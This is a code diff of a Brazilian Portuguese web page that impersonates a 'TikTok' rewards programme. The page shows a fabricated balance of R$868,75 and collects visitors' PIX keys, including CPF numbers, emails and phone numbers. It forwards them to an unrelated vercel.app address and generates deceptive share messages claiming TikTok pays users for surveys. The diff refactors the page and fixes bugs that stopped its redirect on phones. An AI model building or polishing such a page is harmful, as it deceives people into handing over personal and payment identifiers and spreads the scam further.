@@ -1,8 +1,11 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
-<script async="" src="https://www.clarity.ms/tag/wce5x17q6q"></script><script type="text/javascript" async="" src="js/events.js"></script><script>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script async="" src="https://www.clarity.ms/tag/wce5x17q6q"></script>
+<script type="text/javascript" async="" src="js/events.js"></script>
+<script>
 !function (w, d, t) {
   w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<e.methods.length;n++)ttq.setAndDefer(e,e.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-
   ttq.load('D63UGSBC77U6E0JT85CG');
   ttq.page();
 }(window, document, 'ttq');
@@ -20,7 +23,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Resgatar Recompensas — TikTok</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
 :root{--bg:hsl(0,0%,97%);--card:hsl(0,0%,100%);--fg:hsl(0,0%,8%);--primary:hsl(346,97%,55%);--muted:hsl(220,14%,92%);--muted-fg:hsl(220,10%,45%);--border:hsl(220,13%,89%);--reward:hsl(142,71%,45%);--gold:hsl(43,96%,56%)}
 *{margin:0;padding:0;box-sizing:border-box}
@@ -28,29 +31,23 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 @keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
 .fu{animation:fadeUp .35s ease both}
 .d1{animation-delay:.05s}.d2{animation-delay:.1s}.d3{animation-delay:.15s}.d4{animation-delay:.2s}.d5{animation-delay:.25s}.d6{animation-delay:.3s}.d7{animation-delay:.35s}
-
 .card{width:100%;max-width:520px;background:var(--card)}
 @media(min-width:560px){.card{border-radius:1.5rem;margin:20px auto;box-shadow:0 25px 50px -12px rgb(0 0 0/.08)}}
 .inner{padding:20px}
-
 .top-nav{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
 .nav-btn{width:40px;height:40px;border-radius:.875rem;background:var(--muted);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .15s}
 .nav-btn:hover{background:hsl(220 14% 85%)}
-
 .bal-card{background:var(--fg);color:#fff;border-radius:1.25rem;padding:20px;margin-bottom:10px;position:relative;overflow:hidden}
 .bal-card::after{content:'';position:absolute;top:-16px;right:-16px;width:80px;height:80px;background:hsl(0 0% 100%/.06);border-radius:50%}
 .bal-sub{font-size:11px;opacity:.6;font-weight:600;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
 .bal-num{font-size:46px;font-weight:900;font-variant-numeric:tabular-nums;letter-spacing:-1px;line-height:1}
 .bal-confirm{font-size:12px;color:var(--primary);font-weight:600;margin-top:6px}
-
 .sec-title{font-size:17px;font-weight:800;margin-bottom:14px}
 .pix-lbl{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted-fg);margin-bottom:16px}
-
 .amt-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:20px}
 .amt-btn{padding:12px 4px;border-radius:1rem;border:2px solid var(--border);background:hsl(220 14% 92%/.6);font-size:13px;font-weight:800;color:var(--muted-fg);cursor:pointer;text-align:center;transition:all .18s;font-family:'Poppins',sans-serif}
 .amt-btn:hover{border-color:hsl(220 10% 45%/.4);color:var(--fg)}
 .amt-btn.active{background:var(--primary);color:#fff;border-color:var(--primary);box-shadow:0 20px 25px -5px hsl(346 97% 55%/.25);transform:scale(1.05)}
-
 .pix-inputs{display:flex;flex-direction:column;gap:12px;margin-bottom:8px}
 .pix-inputs select,.pix-inputs input{padding:14px 16px;border:2px solid var(--border);border-radius:1rem;font-size:14px;background:hsl(220 14% 92%/.3);color:var(--fg);font-family:'Poppins',sans-serif;outline:none;transition:border-color .18s;-webkit-appearance:none;appearance:none}
 .pix-inputs select:focus,.pix-inputs input:focus{border-color:var(--primary);background:var(--card);box-shadow:0 0 0 2px hsl(346 97% 55%/.1)}
@@ -58,14 +55,10 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 .pix-inputs select.error,.pix-inputs input.error{border-color:hsl(0 84% 60%)}
 .field-error{font-size:11px;color:hsl(0 84% 60%);font-weight:600;margin-top:-6px;margin-bottom:4px;padding-left:4px;display:none}
 .field-error.show{display:block}
-
 .pix-hint{font-size:11px;color:var(--muted-fg);padding-left:4px;margin-bottom:16px}
-
 .saque-btn{width:100%;background:var(--primary);color:#fff;border:none;border-radius:1rem;padding:17px;font-size:15px;font-weight:800;font-family:'Poppins',sans-serif;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 20px 25px -5px hsl(346 97% 55%/.25);transition:transform .15s;margin-bottom:10px}
 .saque-btn:active{transform:scale(.97)}
 .min-note{text-align:center;font-size:12px;color:var(--muted-fg);margin-bottom:24px}
-
-/* Invite card */
 .invite{background:linear-gradient(135deg,var(--primary),hsl(346 97% 42%));border-radius:1.5rem;padding:24px;margin-bottom:20px;color:#fff;position:relative;overflow:hidden}
 .invite::after{content:'';position:absolute;bottom:-24px;right:-24px;width:112px;height:112px;background:hsl(0 0% 100%/.06);border-radius:50%}
 .inv-meta{font-size:11px;opacity:.7;margin-bottom:8px}
@@ -81,8 +74,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 .inv-code{text-align:center;font-size:13px;opacity:.8;display:flex;align-items:center;justify-content:center;gap:8px}
 .copy-btn{background:none;border:none;cursor:pointer;opacity:.7;color:#fff;display:flex;align-items:center;transition:transform .15s}
 .copy-btn:hover{transform:scale(1.1)}
-
-/* FAQ */
 .faq{display:flex;flex-direction:column;gap:2px;margin-bottom:20px}
 .faq-item{background:hsl(220 14% 92%/.3);border-radius:1rem;overflow:hidden}
 .faq-q{width:100%;background:none;border:none;padding:14px 16px;font-size:13px;font-weight:700;font-family:'Poppins',sans-serif;color:var(--fg);text-align:left;cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:8px}
@@ -90,7 +81,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 .faq-a{font-size:12px;color:var(--muted-fg);line-height:1.6;max-height:0;overflow:hidden;transition:max-height .3s ease,padding .3s ease;padding:0 16px}
 .faq-item.open .faq-a{max-height:200px;padding:0 16px 14px}
 .faq-item.open .faq-icon{transform:rotate(45deg)}
-
 .disc{text-align:center;font-size:11px;color:var(--muted-fg);padding-bottom:24px}
 .disc a{color:var(--primary);font-weight:600}
 </style>
@@ -119,7 +109,8 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
     <div class="fu d4">
       <div class="sec-title">Sacar dinheiro</div>
       <div class="pix-lbl"><span style="font-size:20px">🏦</span><span>Transferência bancária / PIX</span></div>
-      <div class="amt-grid" id="amt-grid"><button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$50,00</button><button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$150,00</button><button class="amt-btn disabled-amt" disabled="" title="Complete o saque do saldo total" style="opacity: 0.35; cursor: not-allowed;">R$250,00</button><button class="amt-btn active" title="" style="opacity: 1; cursor: pointer;">R$868,75</button></div>
+      
+      <div class="amt-grid" id="amt-grid"></div>
 
       <div class="pix-inputs">
         <select id="pixType" onchange="onPixTypeChange()">
@@ -164,7 +155,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       </div>
     </div>
 
-    <!-- FAQ -->
     <div class="sec-title fu d6">Dúvidas frequentes</div>
     <div class="faq fu d6" id="faq">
       <div class="faq-item">
@@ -191,27 +181,20 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 
 <script>
 (function(){
-  // ─── Lê params da URL ───────────────────────────────────────────
   const params = new URLSearchParams(window.location.search);
-
-  // Saldo vindo do quiz
   const totalParam = parseFloat(params.get('total'));
   const balance = (!isNaN(totalParam) && totalParam > 0) ? totalParam : 868.75;
 
-  // Formata
   function fmt(v){ return 'R$' + v.toFixed(2).replace('.', ','); }
 
-  // Preenche saldo e última recompensa
   document.getElementById('balNum').textContent = fmt(balance);
 
-  // ─── Botões de valor dinâmicos ──────────────────────────────────
   const amts = [50, 150, 250, Math.floor(balance)];
   const grid = document.getElementById('amt-grid');
   
-  // Limpa botões estáticos antes de gerar para não duplicar (Correção 1)
   grid.innerHTML = ''; 
 
-  amts.forEach((a, i) => {
+  amts.forEach(function(a, i) {
     const b = document.createElement('button');
     const isTotal = i === 3;
     b.className = 'amt-btn' + (isTotal ? ' active' : ' disabled-amt');
@@ -223,29 +206,25 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
     grid.appendChild(b);
   });
 
-  // ─── Código de convite aleatório por sessão ─────────────────────
   let code = sessionStorage.getItem('inv_code');
   if(!code){
     code = Math.floor(10000000 + Math.random() * 89999999).toString();
     sessionStorage.setItem('inv_code', code);
   }
   document.getElementById('invCode').textContent = code;
-  document.getElementById('copyBtn').onclick = () => {
-    navigator.clipboard.writeText(code).then(() => {
+  document.getElementById('copyBtn').onclick = function() {
+    navigator.clipboard.writeText(code).then(function() {
       const btn = document.getElementById('copyBtn');
       btn.style.opacity = '1';
-      setTimeout(() => btn.style.opacity = '.7', 1000);
+      setTimeout(function() { btn.style.opacity = '.7'; }, 1000);
     });
   };
 
-  // ─── Data de campanha dinâmica ──────────────────────────────────
   const now = new Date();
-  const end = new Date(now.getFullYear(), now.getMonth() + 1, 0); // último dia do mês
+  const end = new Date(now.getFullYear(), now.getMonth() + 1, 0); 
   const months = ['jan','fev','mar','abr','mai','jun','jul','ago','set','out','nov','dez'];
-  document.getElementById('inv-meta').textContent =
-    `1 de ${months[now.getMonth()]} – ${end.getDate()} de ${months[end.getMonth()]}`;
+  document.getElementById('inv-meta').textContent = '1 de ' + months[now.getMonth()] + ' – ' + end.getDate() + ' de ' + months[end.getMonth()];
 
-  // ─── Validação de chave PIX ─────────────────────────────────────
   const hints = {
     cpf: 'Formato: 000.000.000-00 ou 00000000000',
     email: 'Formato: seu@email.com',
@@ -261,7 +240,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   };
 
   const validators = {
-    cpf: function(v) { return /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) \vert{}\vert{} /^\d{11}$/.test(v.replace(/\D/g,'')); },
+    cpf: function(v) { return /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) || /^\d{11}$/.test(v.replace(/\D/g,'')); },
     email: function(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); },
     phone: function(v) { return v.replace(/\D/g,'').length >= 10; },
     random: function(v) { return /^[0-9a-f-]{36}$/i.test(v) || v.length > 8; }
@@ -269,10 +248,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 
   window.onPixTypeChange = function(){
     const t = document.getElementById('pixType').value;
-    
-    // (Correção 2) Mostra o formato correto ou volta ao padrão caso não seja encontrado. Nunca apaga.
     document.getElementById('pixHint').textContent = hints[t] ? hints[t] : 'Selecione o tipo de chave para ver o formato esperado';
-    
     document.getElementById('pixKey').value = '';
     document.getElementById('pixType').classList.remove('error');
     document.getElementById('typeErr').classList.remove('show');
@@ -299,8 +275,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
       valid = false;
     }
     
-    // (Correção 3) Substituímos a interrogação de encadeamento "validators[t]?.(key)" por avaliação segura. 
-    // Isso evita o erro fatal que travava os celulares no botão Saque.
     if(!key || (t && validators[t] && !validators[t](key))){
       document.getElementById('pixKey').classList.add('error');
       document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
@@ -310,7 +284,6 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
     
     if(!valid) return;
 
-    // (Correção 4) Forma 100% segura de gerar a URL para não travar o redirecionamento
     const destinoUrl = 'https://pesqdobttklkjkkjtaxval.vercel.app/';
     const parametros = new URLSearchParams(window.location.search);
     parametros.set('pix_type', t);
@@ -319,29 +292,26 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
     window.location.href = destinoUrl + '?' + parametros.toString();
   };
 
-  // ─── Web Share / Convite ───────────────────────────────────────
   window.doShare = function(){
     const shareUrl = window.location.origin + window.location.pathname.replace('withdraw.html','') + 'index.html?ref=' + code;
     const shareText = '🎁 O TikTok está pagando usuários para responder uma pesquisa! Eu já recebi meu Pix. Usa meu código ' + code + ' e garanta o seu:';
     if(navigator.share){
-      navigator.share({ title: 'Programa de Recompensas TikTok', text: shareText, url: shareUrl })
-        .catch(()=>{});
+      navigator.share({ title: 'Programa de Recompensas TikTok', text: shareText, url: shareUrl }).catch(function(){});
     } else {
-      navigator.clipboard.writeText(shareText + ' ' + shareUrl).then(()=>{
+      navigator.clipboard.writeText(shareText + ' ' + shareUrl).then(function(){
         alert('Link copiado! Cole no WhatsApp ou onde quiser.');
       });
     }
   };
 
-  // ─── FAQ accordion ──────────────────────────────────────────────
   window.toggleFaq = function(btn){
     const item = btn.closest('.faq-item');
     const isOpen = item.classList.contains('open');
-    document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
+    document.querySelectorAll('.faq-item').forEach(function(i){ i.classList.remove('open'); });
     if(!isOpen) item.classList.add('open');
   };
 
 })();
 </script>
-
-</body></html>
+</body>
+</html>
